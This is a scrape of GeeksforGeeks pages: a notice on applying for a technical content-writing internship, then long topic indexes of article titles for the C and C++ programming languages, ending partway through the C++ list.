ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects How to get Technical Content Writing Internship at Geeksforgeeks.org? How to get Technical Content Writing Internship at Geeksforgeeks.org? Content Writing internships/freelancing generally are available at GeeksforGeeks round the year and open to all the students who are good in writing and at the same time knowledgeable enough to write about a particular topic. GeeksforGeeks offers two types of Content writing positions for “Work at home Technical Content Writing”. Internship (For students currently studying) Freelancers (For professionals) How to Apply Think of a topic not published at GeeksforGeeks (How to choose topic for writing?) Write it on https://write.geeksforgeeks.org/ Drop a mail and send your resume after 3 articles of yours get published to careers@geeksforgeeks.org with subject “Technical Content Writer and Reviewer” Stipend is paid Useful links: Guide to write an article and review process Benefits of interning as content writer at GeeksforGeeks My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

C Programming Language - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects C Programming Language C is a procedural programming language. It was initially developed by Dennis Ritchie as a system programming language to write operating system. The main features of C language include low-level access to memory, simple set of keywords, and clean style, these features make C language suitable for system programming like operating system or compiler development. Recent Articles on C ! C Output & Multiple Choice Questions Basics, Variable Declaration, Definition and Scope, Data Types, Storage Classes, Input/Output, Operators, Preprocessor, Array & Strings, Control Statements, Functions, Pointers, Enum, Struct and Union, Memory Management, File Handling, Puzzles, Misc, C Language Interview Questions, Multiple Choice Questions Basics: C Language Introduction C Programming Language Standard int (1 sign bit + 31 data bits) keyword in C Is it fine to write “void main()” or “main()” in C/C++? Difference between “int main()” and “int main(void)” in C/C++? Macros and Preprocessors in C Compiling a C program:- Behind the Scenes Benefits of C over other languages Program error signals Escape sequences in C Line Slicing in C C/ C++ Tokens Variable Declaration, Definition and Scope: Variables and Keywords in C How are variables scoped in C – Static or Dynamic? Scope rules in C How Linkers Resolve Multiply Defined Global Symbols? Quiz on Variable Declaration and Scope Complicated declarations in C Redeclaration of global variable in C Internal and External Linkage Declare variable as constant Why variables doesn’t start with numbers Redeclaration of global variables Initialization of global and static variables Data Types: Data Types in C Use of bool in C Integer Promotions in C Quiz on Data Types in C Comparison of a float with a value in C Need of long data type in C size_t data type in C Interesting facts about data-types and modifiers Float and Double in C Character arithmetic in C Typecasting in C Storage Classes: Storage Classes in C Static Variables in C Understanding “extern” keyword in C What are the default values of static variables in C? Understanding “volatile” qualifier in C Const Qualifier in C Initialization of static variables in C Understanding “register” keyword in C Quiz on Storage Classes in C Understanding volatile qualifier in C- Set 1 Input/Output: Returned values of printf() and scanf() What is return type of getchar(), fgetc() and getc() ? Scansets in C puts() vs printf() for printing a string What is use of %n in printf() ? How to print % using printf()? Quiz on Input Output in C Difference between printf, sprintf and fprintf? Difference between getc(), getchar(), getch() and getche() Difference between %d and %i format specifier Use of fflush(stdin) in C Clearing input buffer in C/C++ scanf() and fscanf() in C getchar_unlocked() in C Problem with scanf() Differentiate printable and control character rand() and srand() in C/C++ Operators: Introduction to operators in C and Arithmetic Operators Relational and Logical Operators in C Bitwise Operators in C Operator Precedence and Associativity in C Evaluation order of operands Comma in C and C++ sizeof operator in C Operands for sizeof operator A comma operator question Result of comma operator as l-value in C and C++ Order of operands for logical operators Increment (Decrement) operators require L-value Expression Precedence of postfix ++ and prefix ++ in C/C++ Modulus on Negative Numbers C/C++ Ternary Operator – Some Interesting Observations Pre-increment (or pre-decrement) in C++ Difference between ++*p, *p++ and *++p Results of comparison operations in C and C++ To find sum of two numbers without using any operator Sequence Points in C Execution of printf with ++ operators Anything written in sizeof() is never executed Difference between strlen() and sizeof() Stringizing and Token-pasting operator Preprocessor: Write a C macro PRINT(x) which prints x Variable length arguments for Macros Multiline macros in C CRASH() macro – interpretation The OFFSETOF() macro, Branch prediction macros in GCC Diffference between #define and const in C? A C Programming Language Puzzle What’s difference between header files “stdio.h” and “stdlib.h” ? How to print a variable name in C? Constants in C How a Preprocessor works Preprocessor Directives : Behind the scene-1 Preprocessor Directives : Behind the scene-2 isgraph() library function write your own header file in C difftime() library function tmpnam() library function _Generic keyword in C math.h library functions typedef versus #define in C strftime() library function exec family of functions Arrays & Strings: Introduction to Arrays in C Language Strings in C Language Properties of array in C Language Do not use sizeof for array parameters Initialization of variables sized arrays in C Are array members deeply copied? What is the difference between single quoted and double quoted declaration of char array? Initialization of a multidimensional arrays in C/C++ Write one line functions for strcat() and strcmp() What’s difference between char s[] and char *s in C gets() is risky to use! C function to Swap strings, Storage for Strings in C Difference between array and pointer How to dynamically allocate a 2D array in C? How to pass a 2D array as a parameter in C? How to write long strings in Multi-lines C/C++? What are the data types for which it is not possible to create an array? Variable Length Arrays in C and C++ Short hand array notation Accessing array out of bounds strcpy() in C/C++ strcmp() in C/C++ strdup() and strdndup() in C/C++ Pass an array by value Reverse a string in C/C++ strpbrk() in C strcoll() in C/C++ ispunct() in C strspn() in C isalpha() and isdigit() in C/C++ Control Statements: What should be data type of case labels of switch statement in C? For Versus While A nested loop puzzle switch statement in C Difference between while(1) and while(0) goto statement Continue Statement Break Statement Using range in switch case Functions: Functions in C Importance of function prototype in C Functions that are executed before and after main() in C return statement vs exit() in main() How to Count Variable Numbers of Arguments in C?, What is evaluation order of function parameters in C? Does C support function overloading? How can we return multiple values from a function? What is the purpose of a function prototype? Static functions in C exit(), abort() and assert() Implicit return type int in C What happens when a function is called before its declaration in C? _Noreturn function specifier in C exit() vs _Exit() __func__ identifier in C Callback function in C Nested functions in C Parameter Passing Techniques pow() function in C tolower() function in C time() function in C Pointers: Introduction to pointers in C and C++ Double Pointer (Pointer to Pointer) in C Why C treats array parameters as pointers? Output of the program | Dereference, Reference, Dereference, Reference Dangling, Void , Null and Wild Pointers An Uncommon representation of array elements How to declare a pointer to a function? Pointer vs Array in C void pointer in C NULL pointer in C ! Function Pointer in C near, far and huge pointers Generic Linked List in C restrict keyword in C const char *p, char * const p and const char * const p Pointer to an Array Enum, Struct and Union: Enum in C Structures in C Union in C Struct Hack Structure Member Alignment, Padding and Data Packing Operations on struct variables in C Bit Fields in C Structure Sorting (By Multiple Rules) in C++ Flexible array members in structure Difference between Structure and Union Difference between C structures and C++ structures Anonymous Union and Structure in C Compound Literals in C Memory Management: Memory Layout of C Programs, How to deallocate memory without using free() in C? calloc() versus malloc() How does free() know the size of memory to be deallocated? Use of realloc() What is Memory Leak? How can we avoid? File Handling: fseek() vs rewind() in C EOF, getc() and feof() in C fopen() for an existing file in write mode Read/Write structure to a file fgets() and gets() in C Basics of File Handling fsetpos() in C rename function in C/C++ tmpfile() function in C fgetc() and fputc() in C fseek() in C/C++ ftell() in C lseek() in C/C++ remove function in C/C++ Merge contents of two files into a third file Print contents of file in C Puzzles: C Program to print numbers from 1 to N without using semicolon? How to find sum of two numbers without using any operator How will you show memory representation of C variables? Condition To Print “HelloWord” Change/add only one character and print ‘*’ exactly 20 times How can we sum the digits of a given number in single statement? What is the best way in C to convert a number to a string? Calculate Logn in one line Print “Even” or “Odd” without using Conditional statement How will you print numbers from 1 to 100 without using loop? How can we sum the digits of a given number in single statement? How will you print “Geeks for Geeks” without using a semicolon Write a one line C function to round floating point numbers How will implement Your Own sizeof How to count set bits in a floating point number in C? How to change the output of printf() in main() ? How to find length of a string without string.h and loop in C? Implement your own itoa() Write a C program that does not terminate when Ctrl+C is pressed How to measure time taken by a function in C? Print a long int in C using putchar() only Convert a floating point number to string in C How to write a running C code without main()? Write your own memcpy() C program to print characters without using format specifiers C program to print a string without any quote (singe or double) in the program Execute both if and else statements simultaneously Print “Hello World” without using any header file Misc: Quine – A self-reproducing program Complicated declarations in C Use of bool in C Sequence Points in C | Set 1 Optimization Techniques | Set 2 (swapping), ASCII NUL, ASCII 0 (’0?) and Numeric literal 0 Little and Big Endian Mystery, Comparator function of qsort() in C Program to validate an IP address Multithreading in C Assertions in C/C++ fork() in C Interesting Facts in C Programming Precision of floating point numbers in C++ (floor(), ceil(), trunc(), round() and setprecision()) setjump() and longjump() in C nextafter() and nexttoward() in C/C++ pthread_cancel() in C pthread_equal() in C pthread_self() in C Local Labels in C lvalue and rvalue in C Get and set the stack size of thread attribute Difference between fork() and exec() Errors in C/C++ Why is C considered faster than other languages Incompatibilities between C and C++ Convert C/C++ code to assembly language Error Handling in C Executing main() in C/C++ : Behind the scene Hygienic Macros in C Command line arguments in C/C++ scanf(), fscanf(), sscanf(), scanf_s(), fscanf_s(), sscanf_s() Some Interesting Facts in C Programming Database Connectivity using C/C++ Function Interposition in C Macros vs Functions Write your own memcpy() and memmove() C Language Interview Questions Commonly Asked C Programming Interview Questions | Set 1 Commonly Asked C Programming Interview Questions | Set 2 C/C++ Programs Coding Practice Platform My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

C++ Programming Language - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Basicsexpand_moreC++ Programming LanguageIntroduction to C++ Programming LanguageSetting up C++ Development EnvironmentC++ Programming BasicsC++ Data TypesVariables in C++Loops in C and C++Decision Making in C / C++ (if , if..else, Nested if, if-else-if )Basic Input/Outputexpand_moreI/O Redirection in C++Basic Input / Output in C++Clearing The Input Buffer In C/C++Operatorsexpand_moreOperators in C / C++Unary operators in C/C++Pre-increment (or pre-decrement) in C++new and delete operators in C++ for dynamic memoryArraysexpand_moreArrays in C/C++Multidimensional Arrays in C / C++How to print size of array parameter in C++?Stringsexpand_morestd::string class in C++Raw string literal in C++Array of Strings in C++ (5 Different Ways to Create)Tokenizing a string in C++strrchr() function in C/C++stringstream in C++ and its applicationsFunctionsexpand_moreFunctions in C/C++Default Arguments in C++Inline Functions in C++Return from void functions in C++Functors in C++Pointers & Referencesexpand_morePointers in C and C++ | Set 1 (Introduction, Arithmetic and Array)Opaque PointerReferences in C++‘this’ pointer in C++Introduction of Smart Pointers in C++ and It’s TypesPointers vs References in C++Object Oriented Programmingexpand_moreObject Oriented Programming in C++C++ Classes and ObjectsInheritance in C++Polymorphism in C++Encapsulation in C++Abstraction in C++Function Overloading in C++Operator Overloading in C++Constructors & Destructorsexpand_moreConstructors in C++Copy Constructor in C++Destructors in C++C++ Internals | Default Constructors | Set 1Private DestructorException Handlingexpand_moreException Handling in C++Stack Unwinding in C++Catching base and derived classes as exceptionsCatch block and type conversion in C++Exception handling and object destruction | Set 1File Handlingexpand_moreFile Handling through C++ ClassesRead/Write Class Objects from/to File in C++C++ program to create a fileCSV file management using C++Four File Handling Hacks which every C/C++ Programmer should knowStandart Template Library (STL)expand_moreThe C++ Standard Template Library (STL)Containers in C++ STL (Standard Template Library)Pair in C++ Standard Template Library (STL)List in C++ Standard Template Library (STL)Deque in C++ Standard Template Library (STL)Queue in Standard Template Library (STL)Priority Queue in C++ Standard Template Library (STL)Set in C++ Standard Template Library (STL)Unordered Sets in C++ Standard Template LibraryMultiset in C++ Standard Template Library (STL)Map in C++ Standard Template Library (STL)Advanced C++ with boost librarylibrary in C++ STL C++ Programming Language C++ is a general purpose programming language and widely used now a days for competitive programming. It has imperative, object-oriented and generic programming features. C++ runs on lots of platform like Windows, Linux, Unix, Mac etc. C++ Recent Articles! Basics, C vs C++, C++ vs Java, Input and Output, Operators, Arrays and Strings, Functions, References and Pointers, Dynamic memory allocation, Object Oriented Programming(OOP),Constructor and Destructor, Function Overloading, Operator Overloading, Virtual Functions, Exception Handling, Namespaces, Standard Template Library (STL), Inheritance, C++ Library, C++ Advanced, C++ in Competitive Programming, Puzzles, Interview Questions, Multiple Choice Questions Basics Setting up C++ Development Environment Writing first C++ program(Practice) void main or main() C++ Data Types(Practice) Basic Input/Output Response on exceeding valid range of data types C++ Preprocessors Operators in C++(Practice) Loops (Practice) Decision Making in C++(Practice) Execute both if and else simultaneously How to compile 32-bit program on 64-bit gcc in C and C++ Switch statement in C++(Practice) Functions in C++(Practice) Arrays in C/C++(Practice) Strings in C++(Practice) Pointers in C++(Practice) References in C++ Introduction to OOP in C++ C vs C++ C program that won’t compile in C++ Undefined Behaviour in C and C++ Name Mangling and extern “C” in C++ void * in C vs C++ Program that produces different results in C and C++ Type difference of character literals in C vs C++ Difference between Structures in C and C++ C++ vs Java Inheritance in C++ vs Java static keyword in C++ vs Java default virtual behavior in C++ vs Java Exception Handling in C++ vs Java Foreach in C++ vs Java Templates in C++ vs Generics in Java Foreach in C++ vs Java Floating Point Operations & Associativity in C, C++ and Java Similarities between Java and C++ Input and output I/O Redirection in C++ Clearing The Input Buffer Basic Input/Output(Practice) cout << endl vs cout << “\n” in C++ Problem with scanf() when there is fgets()/gets()/scanf() after it How to use getline() in C++ when there are blank lines in input? scanf() and fscanf() in C – Simple Yet Poweful Using return value of cin to take unknown number of inputs in C++ How to change the output of printf() in main() ? Implementation of a Falling Matrix What does buffer flush means in C++ ? kbhit in C language Code to generate the map of India Operators Operators in C++ Unary operators in C/C++ Conditionally assign a value without using conditional and arithmetic operators Execution of printf with ++ operators Set a variable without using Arithmetic, Relational or Conditional Operator Scope Resolution Operator vs this pointer Pre-increment (or pre-decrement) new and delete operator in C++ CHAR_BIT in C Casting operators| Set 1 (const_cast) Arrays and Strings Arrays in C/C++ Array of Strings Multidimensional arrays in C/C++ Raw string literal Counts of distinct consecutive sub-string of length two Converting string to number and vice-versa Find size of array in C/C++ without using sizeof How to quickly reverse a string in C++? Tokenizing a string in C++ Getline() function and character array Convert string to char array in C++ C++ string class and its applications , Set 2 How to create a dynamic 2D array inside a class in C++ ? Lexicographically next permutation Print size of array parameter Split a string in C/C++, Python and Java Stringstream in C++ and its applications Strchr() function in C/C++ Isspace() in C/C++ and its application to count whitespace characters Char* vs std:string vs char[] in C++ Std::lexicographical_compare() in C++STL Std::string::at in C++ Std::substr() in C/C++ std::stol() and std::stoll() functions in C++ Extract all integers from string in C++ Strchr() function in C++ and its applications Strcat() vs strncat() in C++ Strncat() function in C/C++ Strpbrk() in C strcoll() in C/C++ Why strcpy and strncpy are not safe to use? Functions Functions in C++ Default Arguments C function argument and return values Inline Functions Return from void functions Returning multiple values from a function using Tuple and Pair Function Call Puzzle Functors Ciel and floor functions in C++ Const member functions atol(), atoll() and atof() functions in C/C++ swap() in C++ wmemmove() function in c++ wcscat() function in C++ wcscmp() function in C++ with Examples wcscpy() function in C++ with Examples wcslen() function in C++ with Examples difftime() function in C++ asctime() function in C++ localtime() function in C++ scalbn() function in C++ isunordered() function in C++ isnormal() in C++ isinf() function in C++ quick_exit() function in C++ with Examples ctime() Function in C/C++ clock() function in C/C++ nearbyint() function in C++ quick_exit() function in C++ with Examples wcscmp() function in C++ with Examples wcscpy() function in C++ with Examples wcslen() function in C++ with Examples Pointers and References Pointers in C and C++ What is Array Decay in C++? How can it be prevented? Opaque Pointer References Can references refer to invalid location? Pass arguments by reference or pointer Smart Pointers ‘this’ pointer Type of ‘this’ pointer “delete this” auto_ptr, unique_ptr, shared_ptr and weak_ptr Dangling, Void , Null and Wild Pointers Passing by pointer Vs Passing by Reference NaN in C++ – What is it and how to check for it? nullptr Pointers vs References in C++ Dynamic memory allocation new and delete operator in C++ malloc() vs new delete() and free() Std::get_temporary_buffer in C++ Object Oriented Programming(OOP) Object oriented design Introduction to OOP in C++ Classes and Objects Access Modifiers Inheritance Polymorphism Encapsulation Data Abstraction Structure vs class Can a C++ class have an object of self type? Why is the size of an empty class not zero? Static data members in C++ Some interesting facts about static member functions Friend class and function Local Class Nested Classes Simulating final class Constructor and Destructor Constructors Copy Constructor Destructors Does compiler create default constructor when we write our own? When should we write our own copy constructor? When is copy constructor called? Initialization of data members Use of explicit keyword When do we use Initializer List in? Default Constructors Private Destructor Playing with Destructors Copy elision C++ default constructor | Built-in types When does compiler create a default constructor and copy constructor? Why copy constructor argument should be const in C++? Advanced C++ | Virtual Constructor Advanced C++ | Virtual Copy Constructor Default Constructors When are static objects destroyed? Is it possible to call constructor and destructor explicitly? Function Overloading Function Overloading Functions that can’t be overloaded Function overloading and const keyword Function overloading and return type Does overloading work with Inheritance? Can main() be overloaded Function Overloading and float Operator Overloading Operator Overloading Copy constructor vs assignment operator When should we write our own assignment operator? Operators that cannot be overloaded Conversion Operators Is assignment operator inherited? Default Assignment Operator and References Overloading stream insertion (<<) and extraction (>>) operators Overloading array index operator [] Virtual Functions Virtual Functions and Runtime Polymorphism Default arguments and virtual function Virtual functions in derived classes Can static functions be virtual? Virtual Destructor Virtual Constructor Virtual Copy Constructor RTTI (Run-time type information) Can virtual functions be private? Inline virtual function Pure Virtual Functions and Abstract Classes Pure virtual destructor Exception Handling Exception Handling Basics Stack Unwinding Catching base and derived classes as exceptions Catch block and type conversion Exception handling and object destruction Namespace Namespace in C++ | Set 1 (Introduction) Set 2 (Extending namespace and Unnamed namespace) Namespace in C++ | Set 3 (Accessing, creating header, nesting and aliasing) Inline namespaces and usage of the “using” directive inside namespaces Can namespaces be nested? Standard Template Library (STL) Algorithms Introduction to STL Sorting Searching Containers: Pair (Practice) Vector (Practice) Ways to copy a vector in C++ Sorting 2D Vector in C++ | Set 3 (By number of columns),(Sort in descending order by first and second) Sorting 2D Vector in C++ | Set 2 (In descending order by row and column) 2D vector in C++ with user defined size Vector::clear() and vector::erase() in C++ STL Passing vector to a function in C++ Vector::push_back() and vector::pop_back() in C++ STL Vector::empty() and vector::size() in C++ STL vector::front() and vector::back() in C++ STL Initialize a vector; Different ways Sorting 2D Vector in C++ | Set 1 (By row and column), (Sort by first and second) Computing index using pointers returned by STL functions in C++ List List in C++ | Set 2 (Some Useful Functions) Forward List in C++ | Set 1 (Introduction and Important Functions) Forward List in C++ | Set 2 (Manipulating Functions) list::remove() and list::remove_if() in C++ STL Forward_list::front() and forward_list::empty() in C++ STL Forward_list :: remove() and forward_list :: remove_if() in C++ STL forward_list::unique() in C++ STL forward_list::reverse() in C++ STL forward_list::max_size() in C++ STL forward_list::before_begin() in C++ STL forward_list::cbefore_begin() in C++ STL forward_list::unique() in C++ STL forward_list::before_begin() in C++ STL forward_list::cbefore_begin() in C++ STL forward_list::reverse() in C++ STL forward_list::max_size() in C++ STL forward_list::splice_after() in C++ STL list::empty() and list::size() in C++ STL list::front() and list::back() in C++ STL list::pop_front() and list::pop_back() in C++ STL list::push_front() and list::push_back() in C++ STL list push_front() function in C++ STL list pop_back() function in C++ STL list pop_front() function in C++ STL list reverse function in C++ STL list resize() function in C++ STL list size() function in C++ STL list max_size() function in C++ STL Dequeue Deque::empty() and deque::size() in C++ STL Deque::pop_front() and deque::pop_back() in C++ STL Deque::clear() and deque::erase() in C++ STL Queue (Practice) Queue::front() and queue::back() in C++ STL Queue::push() and queue::pop() in C++ STL queue::empty() and queue::size() in C++ STL Priority Queue Stack (Practice) Stack::push() and stack::pop() in C++ STL Forward_list :: push_front() and forward_list :: pop_front() in C++ STL Stack::top() in C++ STL Stack::empty() and stack::size() in C++ STL Set (Practice) Count number of unique Triangles using STL | Set 1 (Using set) std::istream_iterator and std::ostream_iterator in C++ STL Std::next_permutation and prev_permutation in C++ Std::stoul and std::stoull in C++ Shuffle vs random_shuffle in C++ Difference between set, multiset, unordered_set, unordered_multiset Check if a key is present in a C++ map or unordered_map Std::stable_partition in C++ Valarray slice selector Std::memchr in C++ Std::strncmp() in C++ Stable_sort() in C++ STL Std::memcmp() in C++ Std::memset in C++ Std::bucket_count and std::bucket_size in unordered_map in C++ Map of pairs in STL Range-based for loop in C++ Std::includes() in C++ STL Std::set_symmetric_difference in C++ Std::sort_heap in C++ Map vs unordered_map in C++ Round() in C++ Modulus of two float or double numbers Multiset Map (Practice) Heap using STL C++ Multimap Multimap in C++ Standard Template Library (STL) multimap::find() in C++ STL multimap::erase() in C++ STL map emplace() in C++ STL multimap::emplace_hint() in C++ STL multimap::emplace() in C++ STL multimap::count() in C++ STL multimap::find() in C++ STL multimap::erase() in C++ STL multimap::begin() and multimap::end() in C++ STL multimap::cbegin() and multimap::cend() in C++ STL map cbegin() and cend() function in C++ STL multimap::crbegin() and multimap::crend() in C++ STL multimap size() function in C++ STL multimap lower_bound() function in C++ STL multimap swap() function in C++ STL multimap upper_bound() function in C++ STL multimap maxsize() in C++ STL multimap insert() in C++ STL multimap equal_range() in C++ STL CPP-Math sinh() function in C++ STL cosh() function in C++ STL tanh() function in C++ STL acos() function in C++ STL asinh() function in C++ STL acosh() function in C++ STL atanh() function in C++ STL More: sort() in C++ STL Strand sort Type 